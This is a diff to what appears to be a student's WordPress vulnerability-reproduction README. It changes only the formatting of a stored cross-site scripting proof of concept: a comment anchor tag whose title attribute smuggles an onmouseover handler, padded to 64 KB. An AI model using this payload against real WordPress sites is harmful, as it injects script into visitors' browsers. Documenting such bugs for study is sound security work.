@@ -26,7 +26,7 @@ Time spent: **48** hours spent in total
 - Fixed in version: 4.7.3
 - [ ] GIF Walkthrough: <img src="Untitled design.gif">
 - [ ] Steps to recreate: 
-- Paste the following text in a comment:" <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA...[64 kb]..AAA'></a> "
+- Paste the following text in a comment: *<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA...[64 kb]..AAA'></a>* 
 - Make sure the character length is 64kb or more.
 - [ ] Affected source code:
   - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
